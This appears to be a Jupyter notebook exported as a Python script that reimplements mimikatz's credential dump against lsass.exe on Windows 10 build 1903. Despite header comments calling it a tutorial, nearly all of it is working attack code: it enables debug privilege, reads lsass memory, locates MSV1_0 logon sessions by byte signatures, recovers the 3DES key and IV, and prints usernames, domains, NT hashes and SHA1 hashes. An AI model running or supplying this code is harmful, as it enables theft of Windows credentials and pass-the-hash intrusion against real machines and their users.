#!/usr/bin/env python
# coding: utf-8

# # This is the demo of mimikatz
# - Tutorial purpose, only for understand the concept of credential dump
# - Do not run this on the real environment
# - The test script is aimed at win10, build 1903

# In[44]:


from pyDes import triple_des, CBC
from binascii import unhexlify, hexlify

import ctypes as c                                                                                                                                                                                                   
import os
from ctypes import windll
from ctypes.wintypes import ULONG, BOOL,LONG, DWORD, LPDWORD, LPVOID, HANDLE, HMODULE,  MAX_PATH, LPSTR, WORD, LPWSTR

def RtlAdjustPrivilege():
    NTSTATUS = LONG
    POINTER  = c.POINTER
    SE_DEBUG = 20
    STATUS_SUCCESS = 0
    _RtlAdjustPrivilege = windll.ntdll.RtlAdjustPrivilege
    _RtlAdjustPrivilege.argtypes = [ULONG, BOOL, BOOL, POINTER(BOOL)]
    _RtlAdjustPrivilege.restype  = NTSTATUS
    
    Enabled = BOOL()
    
    status = _RtlAdjustPrivilege(SE_DEBUG, True, False, c.byref(Enabled))
    if status == STATUS_SUCCESS:
        print("Enable debug privilege successfully")
    else:
        print("Fail to enable debug privilege, check your privilege is admin or not")
                                                                                                                                                                                                                
    return True

def openProcess(pid):
    PROCESS_ALL_ACCESS = 0x1fffff
    OpenProcess = windll.kernel32.OpenProcess
    OpenProcess.argtypes = [DWORD, BOOL, DWORD]
    OpenProcess.restype  = HANDLE
        
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if hProcess == None:
        raise c.WinError()
    return hProcess    

def EnumProcessModules(hProcess):
    _EnumProcessModules = windll.psapi.EnumProcessModules
    _EnumProcessModules.argtypes = [HANDLE, LPVOID, DWORD, LPDWORD]
    _EnumProcessModules.restype = bool

    size = 0x1000
    lpcbNeeded = DWORD(size)
    unit = sizeof(HMODULE)
    while 1:
        lphModule = (HMODULE * (size // unit))()
        _EnumProcessModules(hProcess, byref(lphModule), lpcbNeeded, byref(lpcbNeeded))
        needed = lpcbNeeded.value
        if needed <= size:
            break
        size = needed
    return [ lphModule[index] for index in range(0, int(needed // unit)) ]

def getAllPid():
    enumProc = windll.psapi.EnumProcesses
    enumProc.argtypes = [LPVOID, DWORD, LPDWORD]
    enumProc.restype = bool
    
    pids = (DWORD*1024)()
    cbNeeded =DWORD()

    if (enumProc(pids, c.sizeof(pids), c.byref(cbNeeded))):
        print("get all process successfully")
    else:
        print("unable to get all process id")

    pList = {}
    for pid in pids:
        if pid !=0:
            pList[pid]=1
    return list(pList.keys())

def enumProcMod(pid):
    hProcess = openProcess(pid)
    enumProcModules= windll.psapi.EnumProcessModules
    enumProcModules.argtypes = [HANDLE, LPVOID, DWORD, LPDWORD]
    enumProcModules.restype = bool
    hMods = (HMODULE*1024)()
    cbNeeded = DWORD()
    enumProcModules(hProcess, c.byref(hMods), c.sizeof(hMods), c.byref(cbNeeded) )
    return hProcess, hMods

def enumProcModName(hProcess, hMods):
    pMod = c.create_string_buffer( 512)
    getModBaseName = windll.psapi.GetModuleBaseNameA
    getModBaseName.argtypes =[HANDLE, HMODULE, LPSTR, DWORD]
    pModList = {}
    for i in hMods:
        if i==None:
            continue
        getModBaseName(hProcess, i, pMod, c.sizeof(pMod))
        pModList[pMod.value.decode()] = i
    return  pModList

def GetModuleFileNameExW(hProcess, hModule = None):
    getModuleFileNameExW = windll.psapi.GetModuleFileNameExW
    getModuleFileNameExW.argtypes = [HANDLE, HMODULE, LPWSTR, DWORD]
    getModuleFileNameExW.restype = DWORD

    nSize = MAX_PATH
    while 1:
        lpFilename = c.create_unicode_buffer(u"", nSize)
        nCopied = getModuleFileNameExW(hProcess, hModule, lpFilename, nSize)
        if nCopied == 0:
            raise c.WinError()
        if nCopied < (nSize - 1):
            break
        nSize = nSize + MAX_PATH
    return lpFilename.value




#https://docs.microsoft.com/en-us/windows/win32/api/psapi/ns-psapi-moduleinfo
#typedef struct _MODULEINFO {
#  LPVOID lpBaseOfDll;
#  DWORD  SizeOfImage;
#  LPVOID EntryPoint;
#} MODULEINFO, *LP
class MODULEINFO(c.Structure):
    _fields_ = [
        ("lpBaseOfDll",     LPVOID),    # remote pointer
        ("SizeOfImage",     DWORD),
        ("EntryPoint",      LPVOID),    # remote pointer
]
LPMODULEINFO = c.POINTER(MODULEINFO)
#https://docs.microsoft.com/zh-tw/windows/win32/api/psapi/ns-psapi-moduleinfo
#BOOL GetModuleInformation(
#  HANDLE       hProcess,
#  HMODULE      hModule,
#  LPMODULEINFO lpmodinfo,
#  DWORD        cb
#);

def GetModuleInformation(hProcess, hModule, lpmodinfo = None):
    _GetModuleInformation = windll.psapi.GetModuleInformation
    _GetModuleInformation.argtypes = [HANDLE, HMODULE, LPMODULEINFO, DWORD]
    _GetModuleInformation.restype = bool

    if lpmodinfo is None:
        lpmodinfo = MODULEINFO()
    _GetModuleInformation(hProcess, hModule, c.byref(lpmodinfo), c.sizeof(lpmodinfo))
    return lpmodinfo




class _SYSTEM_INFO_OEM_ID_STRUCT(c.Structure):
    _fields_ = [
        ("wProcessorArchitecture",  WORD),
        ("wReserved",               WORD),
]

class _SYSTEM_INFO_OEM_ID(c.Union):
    _fields_ = [
        ("dwOemId",  DWORD),
        ("w",        _SYSTEM_INFO_OEM_ID_STRUCT),
]

class SYSTEM_INFO(c.Structure):
    _fields_ = [
        ("id",                              _SYSTEM_INFO_OEM_ID),
        ("dwPageSize",                      DWORD),
        ("lpMinimumApplicationAddress",     LPVOID),
        ("lpMaximumApplicationAddress",     LPVOID),
        ("dwActiveProcessorMask",           c.c_size_t),
        ("dwNumberOfProcessors",            DWORD),
        ("dwProcessorType",                 DWORD),
        ("dwAllocationGranularity",         DWORD),
        ("wProcessorLevel",                 WORD),
        ("wProcessorRevision",              WORD),
    ]


LPSYSTEM_INFO = c.POINTER(SYSTEM_INFO)

# void WINAPI GetSystemInfo(
#   __out  LPSYSTEM_INFO lpSystemInfo
# );
def GetSystemInfo():
    _GetSystemInfo = windll.kernel32.GetSystemInfo
    _GetSystemInfo.argtypes = [LPSYSTEM_INFO]
    _GetSystemInfo.restype  = None

    sysinfo = SYSTEM_INFO()
    _GetSystemInfo(c.byref(sysinfo))
    return sysinfo

# void WINAPI GetNativeSystemInfo(
#   __out  LPSYSTEM_INFO lpSystemInfo
# );
def GetNativeSystemInfo():
    _GetNativeSystemInfo = windll.kernel32.GetNativeSystemInfo
    _GetNativeSystemInfo.argtypes = [LPSYSTEM_INFO]
    _GetNativeSystemInfo.restype  = None

    sysinfo = SYSTEM_INFO()
    _GetNativeSystemInfo(c.byref(sysinfo))
    return sysinfo


class MEMORY_BASIC_INFORMATION(c.Structure):
    _fields_ = [
    ('BaseAddress', c.c_size_t),# remote pointer
    ('AllocationBase',  c.c_size_t),# remote pointer
    ('AllocationProtect',   DWORD),
    ('RegionSize',  c.c_size_t),
    ('State',   DWORD),
    ('Protect', DWORD),
    ('Type',DWORD),
    ]
PMEMORY_BASIC_INFORMATION = c.POINTER(MEMORY_BASIC_INFORMATION)


class MemoryBasicInformation(object):
    def __init__(self, mbi=None):
        if mbi is None:
            self.BaseAddress        = None
            self.AllocationBase     = None
            self.AllocationProtect  = None
            self.RegionSize         = None
            self.State              = None
            self.Protect            = None
            self.Type               = None
        else:
            self.BaseAddress        = mbi.BaseAddress
            self.AllocationBase     = mbi.AllocationBase
            self.AllocationProtect  = mbi.AllocationProtect
            self.RegionSize         = mbi.RegionSize
            self.State              = mbi.State
            self.Protect            = mbi.Protect
            self.Type               = mbi.Type

def ReadProcessMemory(hProcess, lpBaseAddress, nSize):
    _ReadProcessMemory = windll.kernel32.ReadProcessMemory
    _ReadProcessMemory.argtypes = [HANDLE, LPVOID, LPVOID, c.c_size_t, c.POINTER(c.c_size_t)]
    _ReadProcessMemory.restype  = bool

    lpBuffer            = c.create_string_buffer(nSize)
    lpNumberOfBytesRead = c.c_size_t(0)
    success = _ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, c.byref(lpNumberOfBytesRead))
    ERROR_PARTIAL_COPY = 299
    if not success and windll.kernel32.GetLastError != ERROR_PARTIAL_COPY:
        raise c.WinError()
    return lpBuffer.raw[:lpNumberOfBytesRead.value]

class Page:
    def __init__(self):
        self.BaseAddress = None
        self.AllocationBase  = None
        self.AllocationProtect  = None
        self.RegionSize  = None
        self.EndAddress = None
        self.data = None
    def parse(page_info):
        p = Page()
        p.BaseAddress = page_info.BaseAddress
        p.AllocationBase  = page_info.AllocationBase
        p.AllocationProtect  = page_info.AllocationProtect
        p.RegionSize  = min(page_info.RegionSize, 100*1024*1024) # TODO: need this currently to stop infinite search
        p.EndAddress  = page_info.BaseAddress + page_info.RegionSize
        return p
    def read_data(self, lsass_process_handle):
        self.data = ReadProcessMemory(lsass_process_handle, self.BaseAddress, self.RegionSize)
    
def virtualQueryEx(hProcess, lpAddress):
    vQuery = windll.kernel32.VirtualQueryEx
    lpBuffer = MEMORY_BASIC_INFORMATION()
    dwLength = c.sizeof(MEMORY_BASIC_INFORMATION)
    success = vQuery(hProcess, LPVOID(lpAddress), c.byref(lpBuffer), dwLength)
    if success == 0:
        raise c.WinError()
    return MemoryBasicInformation(lpBuffer)


# In[45]:


def findSig(modules, signature):
    positions = []
    offset = 0
    for i in range(len(modules)):
        data = modules[i].data
        try:
            while 1:
                pos = data.find(signature)
                if pos ==-1:
                    break
                print("find pattern at",pos)
                positions.append(pos + offset + modules[i].BaseAddress)
                offset = offset+ pos + 1
                data = data[pos+1:]
        except:
            print("Fail at module[lsasrv.dll][", i,"]" )
            continue
    if len(positions)>1:
        print("matches multiple pattern")
    return positions


# In[46]:


class dumpedPages:
    def __init__(self, pages, lsassHandle):
        self.pages = pages
        self.currAddr = 0
        self.lsassHandle = lsassHandle
        self.UINT = dict(size = 8, endian="little", signed=False)
        self.PVOID = self.UINT
        self.ULONG = dict(size = 4, endian="little", signed=False)
        self.LONG = dict(size = 4, endian="little", signed=True)
        self.DWORD = dict(size = 4, endian="little", signed=False)
        self.HANDLE = self.UINT
        self.USHORT = dict(size = 2, endian="little", signed=False)
        self.PWSTR = self.UINT
        self.UINT8 = dict(size = 1, endian="little", signed=False)
    def move(self, loc):
        self.currAddr = loc
    def align(self):
        alignment = 8 #amd64 offset is 8
        exceed = self.currAddr%8
        if exceed==0:
            return
        else:
            offset = alignment - exceed
            self.move(self.currAddr + offset)
    def readMemWithType(self, dtype):
        if dtype == "UINT":
            return self.readMem(**self.UINT)
        if dtype == "PVOID":
            return self.readMem(**self.PVOID)
        if dtype == "ULONG":
            return self.readMem(**self.ULONG)
        if dtype == "LONG":
            return self.readMem(**self.LONG)
        if dtype == "DWORD":
            return self.readMem(**self.DWORD)
        if dtype == "HANDLE":
            return self.readMem(**self.HANDLE)
        if dtype == "USHORT":
            return self.readMem(**self.USHORT)
        if dtype == "PWSTR":
            return self.readMem(**self.PWSTR)
        if dtype == "LUID":
            lowPart = self.readMem(**self.DWORD)
            highPart = self.readMem(**self.LONG)
            value = (highPart << 32) +lowPart
            return value
        if dtype =="UINT8":
            return self.readMem(**self.UINT8)
    def readMem(self, pos=None, size=8, endian="little", signed=False):
        if pos==None:
            pos = self.currAddr
        page = self.selectPage( pos)
        baseAddr = page.BaseAddress
        start = pos-baseAddr
        end = start + size
        self.currAddr = end + baseAddr
        mem = page.data
        data = int.from_bytes(mem[start:end], byteorder = endian, signed = signed)
        return data
    def readRaw(self, size, peek=False):
        pos = self.currAddr
        page = self.selectPage(pos)
        baseAddr = page.BaseAddress
        start = pos-baseAddr
        end = start + size
        if peek==False:
            self.currAddr = end + baseAddr
        mem = page.data
        data = mem[start:end]
        return data
    def readPtr(self, pos):
            self.move(pos)
            return self.readMem(**self.UINT)
    def readPtrWithOffset(self, pos=None, size = 4, endian="little", signed=True):
        if pos==None:
            pos = self.currAddr
        page = self.selectPage( pos)
        baseAddr = page.BaseAddress
        start = pos-baseAddr
        end = start + size
        self.currAddr = end + baseAddr
        mem = page.data
        ptr = int.from_bytes(mem[start:end], byteorder = endian, signed = True)
        return ptr + 4 + pos
    def selectPage(self, addr):
        selected = None
        for i in range(len(self.pages)):
            base = self.pages[i].BaseAddress
            end = self.pages[i].EndAddress
            if addr >= base and addr <= end:
                selected = i
        
        if selected == None:
            raise Exception('Would read over segment boundaries!')
        else:
            if self.pages[selected].data == None:
                self.pages[selected].read_data(self.lsassHandle)
            return self.pages[selected]
        


# In[47]:


class LSA_UNICODE_STRING:
    def __init__(self, dump):
        self.length = dump.readMemWithType("USHORT")
        self.MaxLength = dump.readMemWithType("USHORT")
        dump.align()
        self.buffer = dump.readMemWithType("PWSTR")
        #self.value = self.readString(dump)
    def readString(self, dump):
        cPos = dump.currAddr
        if self.buffer == 0 or self.length == 0:
            return b""
        dump.move(self.buffer)
        data = dump.readRaw(self.length)
        string = data.decode("utf-16-le").rstrip("\0")
        dump.currAddr = cPos
        return string
    def readData(self, dump):
        cPos = dump.currAddr
        if self.buffer == 0 or self.length == 0:
            return b""
        dump.move(self.buffer)
        data = dump.readRaw(self.length)
        dump.currAddr = cPos
        return data
class POINTER:
    def __init__(self, dump, ds):
        self.loc = dump.currAddr
        self.value = dump.readMemWithType("UINT")
        self.ds = ds
    def read(self, dump, overrideType=None):
        if overrideType:
            self.ds = overrideType
        cPos = dump.currAddr        
        dump.move(self.value)
        ds = self.ds(dump)
        dump.currAddr = cPos
        return ds
class PSID(POINTER):
    def __init__(self, dump):
        super().__init__(dump, SID)
class SID:
    def __init__(self, dump):
        self.revision = dump.readMemWithType("UINT8")
        self.subAuthorityCount = dump.readMemWithType("UINT8")
        self.identifierAuthority = int.from_bytes(b"\x00\x00" + dump.readRaw(6), byteorder="big", signed=False)
        self.subAuthority = []
        for i in range(self.subAuthorityCount):
            self.subAuthority.append(dump.readMemWithType("ULONG"))
    def __str__(self):
        sid = "S-" + str(self.revision) + "-" + str(self.identifierAuthority)
        for i in self.subAuthority:
            sid += "-" + str(i)
        return sid
class CHAR:
    def __init__(self, dump):
        self.value = dump.readRaw(1).decode("ascii")
class PCHAR(POINTER):
    def __init__(self, dump):
        super().__init__(dump, CHAR)
class ANSI_STRING:
    def __init__(self, dump):
        self.length = dump.readMemWithType("USHORT")
        self.MaxLength = dump.readMemWithType("USHORT")
        self.buffer = PCHAR(dump)
    def readString(self, dump):
        if self.buffer == 0 or self.length == 0:
            return b""
        dump.move(self.buffer)
        data = dump.readRaw(self.length)
        string = data.decode().rstrip("\0")
        return string
class PKIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC(POINTER):
    def __init__(self, dump):
        super().__init__(dump, KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC)
class KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC:
    def __init__(self, dump):
        self.Flink = PKIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC(dump)
        self.Primary = ANSI_STRING(dump)
        dump.align()
        self.encryptedCredentials = LSA_UNICODE_STRING(dump)
class KIWI_MSV1_0_CREDENTIAL_LIST:
    def __init__(self, dump):
        self.Flink = PKIWI_MSV1_0_CREDENTIAL_LIST(dump)
        self.AuthenticationPackageId = dump.readMemWithType("DWORD")
        dump.align()
        self.primaryCredentialsPtr = PKIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC(dump) 
class PKIWI_MSV1_0_CREDENTIAL_LIST(POINTER):
    def __init__(self, dump):
        super().__init__(dump, KIWI_MSV1_0_CREDENTIAL_LIST)

class PKIWI_MSV1_0_LIST_63(POINTER):
    def __init__(self, dump):
        super().__init__(dump, KIWI_MSV1_0_LIST_63)
class KIWI_MSV1_0_LIST_63:
    def __init__(self, dump):
        self.Flink = PKIWI_MSV1_0_LIST_63(dump) #nextLongonSessionLoc
        self.Blink = PKIWI_MSV1_0_LIST_63(dump)
        self.unk0 = dump.readMemWithType("PVOID")
        self.unk1 = dump.readMemWithType("ULONG")
        dump.align()
        self.unk2 = dump.readMemWithType("PVOID")
        self.unk3 = dump.readMemWithType("ULONG")
        self.unk4 = dump.readMemWithType("ULONG")
        self.unk5 = dump.readMemWithType("ULONG")
        dump.align()
        self.hSemaphore6 = dump.readMemWithType("HANDLE")
        self.unk7 = dump.readMemWithType("PVOID")
        self.hSemaphore8 = dump.readMemWithType("HANDLE")
        self.unk9 = dump.readMemWithType("PVOID")
        self.unk10 = dump.readMemWithType("PVOID")
        self.unk11 = dump.readMemWithType("ULONG")
        self.unk12 = dump.readMemWithType("ULONG")
        self.unk13 = dump.readMemWithType("PVOID")
        dump.align()
        self.locallyUniqueIdentifier = dump.readMemWithType("LUID")
        self.secondLocallyUniqueIdentifier = dump.readMemWithType("LUID")
        self.waza = dump.readRaw(12) #waza in mimikatz, just add offset
        dump.align()
        self.userName = LSA_UNICODE_STRING(dump)
        self.domainName = LSA_UNICODE_STRING(dump)
        self.unk14 = dump.readMemWithType("PVOID")
        self.unk15 = dump.readMemWithType("PVOID")
        self.type = LSA_UNICODE_STRING(dump)
        self.psid = PSID(dump)
        self.logonType = dump.readMemWithType("ULONG")
        dump.align()
        self.unk18 = dump.readMemWithType("PVOID")
        self.session = dump.readMemWithType("ULONG")
        dump.align()
        self.logonTime = int.from_bytes(dump.readRaw(8), byteorder="little", signed=False)
        self.logonServer = LSA_UNICODE_STRING(dump)
        self.credentialsListPtr = PKIWI_MSV1_0_CREDENTIAL_LIST(dump)
        self.unk19 = dump.readMemWithType("PVOID")
        self.unk20 = dump.readMemWithType("PVOID")
        self.unk21 = dump.readMemWithType("PVOID")
        self.unk22 = dump.readMemWithType("ULONG")
        self.unk23 = dump.readMemWithType("ULONG")
        self.unk24 = dump.readMemWithType("ULONG")
        self.unk25 = dump.readMemWithType("ULONG")
        self.unk26 = dump.readMemWithType("ULONG")
        dump.align()
        self.unk27 = dump.readMemWithType("PVOID")
        self.unk28 = dump.readMemWithType("PVOID")
        self.unk29 = dump.readMemWithType("PVOID")
        self.credentialManager = dump.readMemWithType("PVOID")

#des key structure

class KIWI_HARD_KEY:
    def __init__(self, dump):
        self.cbSecret = dump.readMemWithType("ULONG")
        self.data = dump.readRaw(self.cbSecret)
class KIWI_BCRYPT_KEY:
    def __init__(self, dump):
        self.size = dump.readMemWithType("ULONG")
        self.tag = dump.readRaw(4)
        self.type = dump.readMemWithType("ULONG")
        self.unk0 = dump.readMemWithType("ULONG")
        self.unk1 = dump.readMemWithType("ULONG")
        self.unk2 = dump.readMemWithType("ULONG")
        self.hardkey = KIWI_HARD_KEY(dump)
class PKIWI_BCRYPT_KEY(POINTER):
    def __init__(self, dump):
        super().__init__(dump, KIWI_BCRYPT_KEY)
class KIWI_BCRYPT_HANDLE_KEY:
    def __init__(self, dump):
        self.size = dump.readMemWithType("ULONG")
        self.tag = dump.readRaw(4)#should be RUUU
        self.hAlgorithm = dump.readMemWithType("PVOID")
        self.ptrKey = PKIWI_BCRYPT_KEY(dump)
        self.unk0 = dump.readMemWithType("PVOID")
    def verify(self):
        return self.tag==b"RUUU"
        
class KIWI_BCRYPT_KEY81:
    def __init__(self, dump):
        self.size = dump.readMemWithType("ULONG")
        self.tag  = dump.readRaw(4)    # 'MSSK'
        self.type = dump.readMemWithType("ULONG")
        self.unk0 = dump.readMemWithType("ULONG")
        self.unk1 = dump.readMemWithType("ULONG")
        self.unk2 = dump.readMemWithType("ULONG") 
        self.unk3 = dump.readMemWithType("ULONG")
        self.unk4 = dump.readMemWithType("ULONG")
        dump.align()
        self.unk5 = dump.readMemWithType("PVOID")    #before, align in x64
        self.unk6 = dump.readMemWithType("ULONG")
        self.unk7 = dump.readMemWithType("ULONG")
        self.unk8 = dump.readMemWithType("ULONG")
        self.unk9 = dump.readMemWithType("ULONG")
        self.hardkey = KIWI_HARD_KEY(dump)
    def verify(self):
        return self.tag == b'KSSM' 


# In[52]:


signature = b'\x33\xff\x41\x89\x37\x4c\x8b\xf3\x45\x85\xc0\x74'
firstEntryOffset = 23
sessCountOffset = -4
keySignature = b'\x83\x64\x24\x30\x00\x48\x8d\x45\xe0\x44\x8b\x4d\xd8\x48\x8d\x15'
IVLength = 16
IVOffset = 67
DESKeyPtrOffset = -89


# In[ ]:


result = RtlAdjustPrivilege()
print(result)


# In[48]:


lsassPid = input("Please input the lsass PID")
lsassHandle, lsassMod = enumProcMod(int(lsassPid))


# In[49]:


moduleHandle = enumProcModName(lsassHandle, lsassMod)


# In[50]:


if "lsass.exe" not in moduleHandle:
    raise Exception("you type the wrong PID")


# In[51]:


sysinfo = GetSystemInfo()
currentAddr = sysinfo.lpMinimumApplicationAddress
pages = []
while currentAddr < sysinfo.lpMaximumApplicationAddress:
    pageInfo = virtualQueryEx(lsassHandle, currentAddr)
    pages.append(Page.parse(pageInfo))
    currentAddr += pageInfo.RegionSize


modules = {}
for i in moduleHandle.keys():
    modules[i] = []
    modInfo = GetModuleInformation(lsassHandle, moduleHandle[i])
    modBase = modInfo.lpBaseOfDll
    modEnd = modBase + modInfo.SizeOfImage
    for j in pages:
        if  modBase <=j.BaseAddress <=modEnd:
            modules[i].append(j)



# In[53]:


for i in range(len(modules["lsasrv.dll"])):
    try:
        modules['lsasrv.dll'][i].read_data(lsassHandle)
        data = modules['lsasrv.dll'][i].data
    except:
        print("fail to read the memory of lsasrv[",i ,"]")
        continue
positions = findSig(modules["lsasrv.dll"], signature)
pos = positions[0]
keyPos = findSig(modules["lsasrv.dll"], keySignature)


# In[54]:



dump =dumpedPages(pages, lsassHandle)
sessPtr = dump.readPtrWithOffset(pos+sessCountOffset)
sessCount = dump.readMem(sessPtr, 1, endian="big")
entryPtrLoc = dump.readPtrWithOffset(pos+firstEntryOffset)
entryPtrVal = dump.readPtr(entryPtrLoc)
dump.move(entryPtrLoc)#msv/decryptor.py line:362
mimi = PKIWI_MSV1_0_LIST_63(dump)
firstSess = mimi.read(dump)


# In[55]:


ptrToCred = firstSess.credentialsListPtr.read(dump)


# In[56]:


primaryCred =ptrToCred.primaryCredentialsPtr.read(dump)


# In[57]:


encPasswd = primaryCred.encryptedCredentials.readData(dump)
if len(encPasswd)%8 !=0:
    raise Exception("the legth of encpassword is wrong")


# In[58]:


# get the DES KEY and IV
IVPtr = dump.readPtrWithOffset(keyPos[0] + IVOffset) #getIVPtr
dump.move(IVPtr)
IV = dump.readRaw(IVLength)
DESKeyPtr = dump.readPtrWithOffset(keyPos[0] + DESKeyPtrOffset)
DESKeyPtr = dump.readPtr(DESKeyPtr)
dump.move(DESKeyPtr)
KBHK = KIWI_BCRYPT_HANDLE_KEY(dump)
dump.move(KBHK.ptrKey.value)
KBK = KBHK.ptrKey.read(dump, KIWI_BCRYPT_KEY81)
desKey = KBK.hardkey.data


# In[59]:


# decrypted the passWd
k = triple_des(desKey, CBC, IV[:8])
plainTxt = k.decrypt(encPasswd)
plainTxt = str(hexlify(plainTxt))


# In[60]:


NT = plainTxt[150:182]

SHA1 = plainTxt[214:254]

print("userName:", firstSess.userName.readString(dump))
print("domainName:", firstSess.domainName.readString(dump))
print("NT:", NT)
print("SHA1:", SHA1)

